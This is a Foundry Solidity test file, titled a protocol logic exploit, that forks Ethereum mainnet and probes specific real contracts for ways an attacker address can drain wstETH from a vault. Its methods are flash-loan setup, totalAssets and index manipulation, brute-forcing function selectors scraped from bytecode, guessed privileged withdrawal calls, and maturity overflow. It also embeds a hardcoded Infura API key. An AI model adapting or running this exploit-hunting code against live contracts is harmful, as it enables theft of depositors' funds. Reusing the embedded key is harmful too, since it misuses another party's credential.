// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IAave {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IBalancer {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

/**
 * PROTOCOL LOGIC EXPLOIT - NOVEL PATHWAYS
 *
 * Focus on:
 * 1. Rate/index manipulation via flash loans
 * 2. totalAssets manipulation
 * 3. Alternative contracts with VAULT access
 * 4. Cross-protocol interactions
 * 5. Storage slot manipulation via index corruption
 */
contract ProtocolLogicExploit is Test {
    address constant R0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;
    address constant TIMELOCK = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e;

    // DeFi protocols for flash loans
    address constant AAVE_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeProtocolRates() public view {
        console.log("=== ANALYZE PROTOCOL RATES ===\n");

        // TASSET totalAssets
        (bool s1, bytes memory d1) = TASSET.staticcall(abi.encodeWithSignature("totalAssets()"));
        if (s1) {
            uint256 totalAssets = abi.decode(d1, (uint256));
            console.log("TASSET totalAssets:", totalAssets / 1e18);
        }

        // TASSET totalSupply
        uint256 totalSupply = IERC20(TASSET).totalSupply();
        console.log("TASSET totalSupply:", totalSupply / 1e18);

        // VAULT wstETH balance
        uint256 vaultBal = IERC20(wstETH).balanceOf(VAULT);
        console.log("VAULT wstETH:", vaultBal / 1e18);

        // Calculate implicit rate
        if (totalSupply > 0) {
            uint256 implicitRate = vaultBal * 1e18 / totalSupply;
            console.log("Implicit rate (wstETH/TASSET):", implicitRate);
        }

        // Check R0 storage for rate-related slots
        console.log("\nR0 Storage Analysis:");
        for (uint i = 0; i <= 10; i++) {
            bytes32 slot = vm.load(R0, bytes32(uint256(i)));
            if (slot != bytes32(0)) {
                console.log("Slot", i);
                console.logBytes32(slot);
            }
        }
    }

    function test_FindAlternativeVAULTAccess() public view {
        console.log("=== FIND ALTERNATIVE VAULT ACCESS ===\n");

        // Check VAULT's allowances to various addresses
        address[] memory checkAddrs = new address[](15);
        checkAddrs[0] = RC;
        checkAddrs[1] = R0;
        checkAddrs[2] = TASSET;
        checkAddrs[3] = TIMELOCK;
        checkAddrs[4] = 0x1af329D2C4CeaF45E1D8062c696b09FfadDb933a; // VAULT_SLOT2
        checkAddrs[5] = 0x97c03F52244E60BB18511Cbf03f890D5886f1F47; // VAULT_SLOT5
        checkAddrs[6] = 0xEf69713F639130B6F0D4A12a11E2169a4d1bD52a; // IAU
        checkAddrs[7] = 0x89f57D3617F6a9FF877fEa34Dd0688b2840Ef50e; // From VAULT slot 5 data
        checkAddrs[8] = address(0);
        checkAddrs[9] = 0x7EeeAd4571b12BC3e331E6Ce2D954E1528aC2921;
        checkAddrs[10] = 0xE24a3DC889621612422A64E6388927901608B91D;
        checkAddrs[11] = 0xe26D9c68cF6d284367C5e90EC834C6Ec0051f73C;
        checkAddrs[12] = 0xDe4a1B2EA88Ec03E93aAD9D4c5bFFeB18687D079;
        checkAddrs[13] = 0x3Ef3D8bA38EBe18DB133cEc108f4D14CE00Dd9Ae;
        checkAddrs[14] = 0xe3D41d19564922C9952f692C5Dd0563030f5f2EF;

        for (uint i = 0; i < checkAddrs.length; i++) {
            uint256 allowance = IERC20(wstETH).allowance(VAULT, checkAddrs[i]);
            if (allowance > 0) {
                console.log("VAULT -> %s allowance:", checkAddrs[i]);
                if (allowance == type(uint256).max) {
                    console.log("  UNLIMITED");
                } else {
                    console.log("  ", allowance / 1e18);
                }
            }
        }

        // Check VAULT storage for more addresses
        console.log("\nVAULT Storage Analysis:");
        for (uint i = 0; i <= 15; i++) {
            bytes32 slot = vm.load(VAULT, bytes32(uint256(i)));
            if (slot != bytes32(0)) {
                console.log("Slot", i);
                console.logBytes32(slot);
                // Check if it looks like an address
                address addr = address(uint160(uint256(slot)));
                if (addr.code.length > 0) {
                    console.log("  -> Contract:", addr);
                }
            }
        }
    }

    function test_ExploitViaIndexManipulation() public {
        console.log("=== EXPLOIT VIA INDEX MANIPULATION ===\n");

        // If there's a way to manipulate the redemption index/amount...
        deal(TASSET, attacker, 100000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        // Create a redemption
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));

        // Check redemption data
        bytes32 arrayLengthSlot = keccak256(abi.encode(attacker, uint256(5)));
        bytes32 lengthData = vm.load(R0, arrayLengthSlot);
        console.log("Redemption count:", uint256(lengthData));

        if (uint256(lengthData) > 0) {
            bytes32 baseSlot = keccak256(abi.encode(arrayLengthSlot));
            bytes32 slot0 = vm.load(R0, baseSlot);
            bytes32 slot1 = vm.load(R0, bytes32(uint256(baseSlot) + 1));

            console.log("Original redemption data:");
            console.logBytes32(slot0);
            console.logBytes32(slot1);

            // Try to manipulate the redemption data via storage collision
            // This would require finding another function that writes to the same slot

            // Calculate what address would map to this slot
            // slot = keccak256(keccak256(attacker, 5))
            // We need to find an operation that writes here

            console.log("\nSearching for collision vectors...");

            // Check if any other mapping could collide
            // mapping(address => X) at slot N would have data at keccak256(addr, N)
        }

        vm.stopPrank();
    }

    function test_ExploitViaTotalAssetsManipulation() public {
        console.log("=== EXPLOIT VIA TOTAL ASSETS MANIPULATION ===\n");

        // If we can manipulate totalAssets without changing totalSupply,
        // we might be able to get more wstETH per TASSET

        uint256 totalAssetsBefore;
        (bool s1, bytes memory d1) = TASSET.staticcall(abi.encodeWithSignature("totalAssets()"));
        if (s1) {
            totalAssetsBefore = abi.decode(d1, (uint256));
            console.log("totalAssets before:", totalAssetsBefore / 1e18);
        }

        uint256 totalSupply = IERC20(TASSET).totalSupply();
        console.log("totalSupply:", totalSupply / 1e18);

        // Check what functions can modify totalAssets
        // Usually it's deposit/withdraw/harvest/compound

        vm.startPrank(attacker);

        // Try calling functions that might affect totalAssets
        bytes4[] memory sigs = new bytes4[](15);
        sigs[0] = bytes4(keccak256("harvest()"));
        sigs[1] = bytes4(keccak256("compound()"));
        sigs[2] = bytes4(keccak256("rebalance()"));
        sigs[3] = bytes4(keccak256("accrueRewards()"));
        sigs[4] = bytes4(keccak256("updateIndex()"));
        sigs[5] = bytes4(keccak256("syncAssets()"));
        sigs[6] = bytes4(keccak256("updateTotalAssets()"));
        sigs[7] = bytes4(keccak256("claim()"));
        sigs[8] = bytes4(keccak256("processRewards()"));
        sigs[9] = bytes4(keccak256("distribute()"));
        sigs[10] = bytes4(keccak256("donate(uint256)"));
        sigs[11] = bytes4(keccak256("sweep(address)"));
        sigs[12] = bytes4(keccak256("skim(address)"));
        sigs[13] = bytes4(keccak256("sync()"));
        sigs[14] = bytes4(keccak256("poke()"));

        for (uint i = 0; i < sigs.length; i++) {
            (bool success,) = TASSET.call(abi.encodeWithSelector(sigs[i]));
            if (success) {
                console.log("Success with selector %d", i);
                console.logBytes4(sigs[i]);

                // Check if totalAssets changed
                (bool s2, bytes memory d2) = TASSET.staticcall(abi.encodeWithSignature("totalAssets()"));
                if (s2) {
                    uint256 totalAssetsAfter = abi.decode(d2, (uint256));
                    if (totalAssetsAfter != totalAssetsBefore) {
                        console.log("*** totalAssets CHANGED! ***");
                        console.log("Before:", totalAssetsBefore / 1e18);
                        console.log("After:", totalAssetsAfter / 1e18);
                    }
                }
            }
        }

        // Also try on VAULT
        for (uint i = 0; i < sigs.length; i++) {
            (bool success,) = VAULT.call(abi.encodeWithSelector(sigs[i]));
            if (success) {
                console.log("VAULT success with selector %d", i);
            }
        }

        vm.stopPrank();
    }

    function test_ExploitViaFlashLoanAttack() public {
        console.log("=== EXPLOIT VIA FLASH LOAN ATTACK ===\n");

        // Flash loan to manipulate some state then exploit
        // This requires finding a state that can be manipulated atomically

        uint256 vaultBalBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("VAULT wstETH before:", vaultBalBefore / 1e18);

        // Check if there's a donate/deposit function on VAULT that affects rate
        vm.startPrank(attacker);

        // Give attacker some wstETH
        deal(wstETH, attacker, 10000e18);
        IERC20(wstETH).approve(VAULT, type(uint256).max);
        IERC20(wstETH).approve(TASSET, type(uint256).max);

        console.log("\nTrying to donate/deposit to VAULT...");

        bytes4[] memory depositSigs = new bytes4[](10);
        depositSigs[0] = bytes4(keccak256("deposit(uint256)"));
        depositSigs[1] = bytes4(keccak256("deposit(uint256,address)"));
        depositSigs[2] = bytes4(keccak256("donate(uint256)"));
        depositSigs[3] = bytes4(keccak256("contribute(uint256)"));
        depositSigs[4] = bytes4(keccak256("addAssets(uint256)"));
        depositSigs[5] = bytes4(keccak256("mint(uint256,address)"));
        depositSigs[6] = bytes4(keccak256("stake(uint256)"));
        depositSigs[7] = bytes4(keccak256("supply(uint256)"));
        depositSigs[8] = bytes4(keccak256("fund(uint256)"));
        depositSigs[9] = bytes4(keccak256("topUp(uint256)"));

        for (uint i = 0; i < depositSigs.length; i++) {
            bytes memory data;
            if (i == 1 || i == 5) {
                data = abi.encodeWithSelector(depositSigs[i], 100e18, attacker);
            } else {
                data = abi.encodeWithSelector(depositSigs[i], 100e18);
            }

            (bool success,) = VAULT.call(data);
            if (success) {
                console.log("VAULT deposit success with selector %d", i);
            }

            (bool success2,) = TASSET.call(data);
            if (success2) {
                console.log("TASSET deposit success with selector %d", i);
            }
        }

        vm.stopPrank();

        uint256 vaultBalAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVAULT wstETH after:", vaultBalAfter / 1e18);
    }

    function test_ExploitViaRedemptionControllerDirect() public {
        console.log("=== EXPLOIT VIA RC DIRECT FUNCTIONS ===\n");

        // RC has unlimited allowance from VAULT
        // Look for any function on RC that transfers wstETH

        console.log("RC code size:", RC.code.length);

        // Extract function selectors from RC bytecode
        bytes memory code = RC.code;

        console.log("\nSearching RC for transfer functions...");

        // Look for PUSH4 patterns that might be function selectors
        uint found = 0;
        for (uint i = 0; i < code.length - 4 && found < 50; i++) {
            if (uint8(code[i]) == 0x63) { // PUSH4
                bytes4 sel = bytes4(
                    bytes32(
                        (uint256(uint8(code[i+1])) << 24) |
                        (uint256(uint8(code[i+2])) << 16) |
                        (uint256(uint8(code[i+3])) << 8) |
                        uint256(uint8(code[i+4]))
                    )
                );

                // Try calling this selector
                vm.startPrank(attacker);
                (bool s, bytes memory ret) = RC.call{gas: 100000}(abi.encodeWithSelector(sel));
                if (s) {
                    console.log("Callable selector at offset %d:", i);
                    console.logBytes4(sel);
                    found++;
                }
                vm.stopPrank();
            }
        }

        // Also try known withdrawal patterns
        vm.startPrank(attacker);

        bytes4[] memory withdrawSigs = new bytes4[](15);
        withdrawSigs[0] = bytes4(keccak256("processWithdrawal(address,uint256)"));
        withdrawSigs[1] = bytes4(keccak256("executeWithdrawal(address,uint256)"));
        withdrawSigs[2] = bytes4(keccak256("sendFunds(address,uint256)"));
        withdrawSigs[3] = bytes4(keccak256("transferFunds(address,uint256)"));
        withdrawSigs[4] = bytes4(keccak256("releaseFunds(address,uint256)"));
        withdrawSigs[5] = bytes4(keccak256("claimFunds(address,uint256)"));
        withdrawSigs[6] = bytes4(keccak256("withdrawTo(address,uint256)"));
        withdrawSigs[7] = bytes4(keccak256("pullFunds(uint256)"));
        withdrawSigs[8] = bytes4(keccak256("sweep(address,address,uint256)"));
        withdrawSigs[9] = bytes4(keccak256("rescue(address,address,uint256)"));
        withdrawSigs[10] = bytes4(keccak256("emergencyTransfer(address,uint256)"));
        withdrawSigs[11] = bytes4(keccak256("forceTransfer(address,uint256)"));
        withdrawSigs[12] = bytes4(keccak256("adminTransfer(address,uint256)"));
        withdrawSigs[13] = bytes4(keccak256("ownerTransfer(address,uint256)"));
        withdrawSigs[14] = bytes4(keccak256("privilegedTransfer(address,uint256)"));

        uint256 wstethBefore = IERC20(wstETH).balanceOf(attacker);

        for (uint i = 0; i < withdrawSigs.length; i++) {
            (bool success,) = RC.call(
                abi.encodeWithSelector(withdrawSigs[i], attacker, 1000e18)
            );
            if (success) {
                console.log("*** RC withdrawal success with selector %d ***", i);
                console.logBytes4(withdrawSigs[i]);
            }
        }

        uint256 wstethAfter = IERC20(wstETH).balanceOf(attacker);
        console.log("\nwstETH gained:", (wstethAfter - wstethBefore) / 1e18);

        vm.stopPrank();
    }

    function test_ExploitViaMaturityTimeOverflow() public {
        console.log("=== EXPLOIT VIA MATURITY TIME OVERFLOW ===\n");

        // If maturity is stored as uint96 and we can cause overflow...
        // uint96 max = 79228162514264337593543950335

        // Set delay to 0 to simplify
        bytes32 slot4 = vm.load(R0, bytes32(uint256(4)));
        uint256 newSlot4 = uint256(slot4) & ~(uint256(type(uint32).max) << 96);
        vm.store(R0, bytes32(uint256(4)), bytes32(newSlot4));

        deal(TASSET, attacker, 100000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        // Create redemption
        (bool redeemOk,) = R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        console.log("Redeem success:", redeemOk);

        // Check redemption data
        bytes32 arrayLengthSlot = keccak256(abi.encode(attacker, uint256(5)));
        bytes32 baseSlot = keccak256(abi.encode(arrayLengthSlot));
        bytes32 slot0 = vm.load(R0, baseSlot);

        console.log("Redemption slot 0:");
        console.logBytes32(slot0);

        // Extract maturity (assuming it's in the lower bits)
        // Try different bit layouts
        uint256 raw = uint256(slot0);

        console.log("\nTrying different maturity layouts:");
        console.log("As uint32 (bits 0-31):", uint32(raw));
        console.log("As uint64 (bits 0-63):", uint64(raw));
        console.log("As uint96 (bits 0-95):", uint96(raw));

        // If maturity is stored as uint32 and current time is ~1.7B
        // then uint32.max = 4.29B, overflow would be ~2.5B seconds in future

        // Try finalizing
        (bool finalizeOk,) = R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        console.log("\nFinalize success:", finalizeOk);

        vm.stopPrank();

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }
}
